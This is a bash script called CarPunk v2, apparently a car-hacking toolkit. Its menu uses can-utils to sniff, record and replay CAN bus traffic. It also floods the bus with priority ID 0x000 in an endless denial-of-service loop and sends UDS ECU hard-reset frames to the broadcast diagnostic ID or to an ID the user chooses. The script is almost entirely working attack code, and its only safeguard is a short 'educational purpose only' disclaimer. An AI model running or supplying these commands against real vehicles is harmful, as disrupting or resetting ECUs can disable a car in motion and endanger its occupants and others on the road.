#!/bin/bash


#Project: CarPunk v2 (CAN Injection Toolkit)
#Coded By: souravbaghz

#+++++++++++++++++++++++++ WARNINGS ++++++++++++++++++++++++++ 
#EDUCATIONAL PURPOSE ONLY - DON'T USE ON UNAUTHORISED VEHICLES
#I AM NOT RESPONSIBLE FOR ANY BAD USE OF THIS TOOL 

#Colours
bold="\e[1m"
italic="\e[3m"
reset="\e[0m"
blink="\e[5m"
crayn="\e[36m"
yellow="\e[93m"
red="\e[31m"
black="\e[30m"
green="\e[92m"
redbg="\e[41m"
greenbg="\e[40m"

banner(){
echo -e "$green

       ▄▄▐▀▀▀▀▀▀▀▀▀▀▀▌▄▄
      ▄▄▄█▄▄▄▄▄▄▄▄▄▄▄█▄▄▄
      █▄█░░█▓█▓█▓█▓█░░█▄█▌
      ▓▓█▀███████████▀█▓▓
      ▓▓▀▀${reset}souravbaghz${green}▀▀▓▓   
  █▀▀ ▄▀█ █▀█ █▀█ █░█ █▄░█ █▄▀
  █▄▄ █▀█ █▀▄ █▀▀ █▄█ █░▀█ █░█
      ${bold}ⲤⲀⲚ Ⲓⲛ𝓳ⲉⲥⲧⲓⲟⲛ Ⲧⲟⲟ𝓵ⲕⲓⲧ$reset                            
 $reset──────────────────────────────"
}

if [ -z "$1" ]
  then
    banner
    echo " Interface is not supplied"  #interface not supplied 
    echo " Usage : carpunk.sh <Inferface>"
    echo " Example: ./carpunk.sh can0"
    exit 1
fi

mkdir -p logs
#var
msg="          HACK THE CAR"
inc="1"

#=============================================
# YOU CAN CHANGE THE VARIABLE FOR LOG.
interface="$1"
log="carpunk"
#=============================================

trap ctrl_c INT

ctrl_c(){
   echo
   echo "CTRL_C by user"
   menu
}

menu(){
clear
banner
echo -e "$bold$green$msg$reset"
echo -e " ──────────────────────────────$reset"
echo -e "$red [1]$green CAN Interface Up"
echo -e "$red [2]$green CAN Interface Down"
echo -e "$red [3]$green Start the Sniffing"
echo -e "$red [4]$green Record the CAN Frames"
echo -e "$red [5]$green Play the CAN Frames"
echo -e "$red [6]$green DOS Attack (0x000)"
echo -e "$red [7]$green ECU Hard Reset(0x7DF)"
echo -e "$red [8]$green ECU Hard Reset with Custom ID"

echo -e "$red [0]$green Exit$reset"
read -p " [?] Choose: " option

if [[ $option = 1 || $option = 01 ]]
	then
        ip link set $interface up
        msg="      Interface is up now!"
        clear
		menu

	elif [[ $option = 2 || $option = 02 ]]
	   then
	    ip link set $interface down
        msg="     Interface is down now!"
        clear
		menu
        
    elif [[ $option = 3 || $option = 03 ]]
       then
         echo -e " ──────────────────────────────"
         msg="       HAPPY CAR HACKING"
         cansniffer $interface -c
		 read -r -s -p $'Press ENTER to go menu.'
         clear
		 menu
		 
	elif [[ $option = 4 || $option = 04 ]]
       then
         echo -e " ──────────────────────────────"
         msg=" Recorded & stored as $log$inc.log"
         echo -e "$green Dumping CAN Packets..."
         candump -L $interface >logs/$log$inc.log
         inc=$((inc+1))
         echo " >"
		 read -r -s -p $'Press ENTER to go menu.'
		 menu

    elif [[ $option = 5 || $option = 05 ]]
       then
         echo -e " ──────────────────────────────"
         msg="    Replay Attack Completed"
         read -p "[?]Enter log name: " logname
         echo -e "$green Playing CAN Frames..."
         canplayer -I logs/$logname
         clear
		 menu
		  	 
	elif [[ $option = 6 || $option = 06 ]]
       then
         echo -e " ──────────────────────────────"
         msg="      DOS Attack Completed"
         while true
         do
           echo "Executing DOS Attack..."
           cansend $interface 000#0000000000000000  
              clear
            done
         clear
		 menu
	
	elif [[ $option = 7 || $option = 07 ]]
       then
         echo -e " ──────────────────────────────"
         msg="    ECU Hard Reset Completed"
         cansend $interface 7DF#0211010000000000
         #cansend $interface 7E1#0211010000000000
         clear
		 menu
		 	
	elif [[ $option = 8 || $option = 08 ]]
       then
         echo -e " ──────────────────────────────"
         msg="    ECU Hard Reset Request Sent!"
		 read -p "[?]Enter UDS Arbitrary-ID:" AID
         cansend $interface $AID#0211010000000000
         clear
		 menu
		 
	elif [[ $option = 0 || $option = 00 ]]
       then
         echo -e "[!]Exiting...${green}${reset}"
		 clear	 
         exit 1
         
        else
		echo "Invalid Option..."
		sleep 1
        msg="   Oops! It's Incorrect Option"
		clear
		menu
	fi	
}


menu
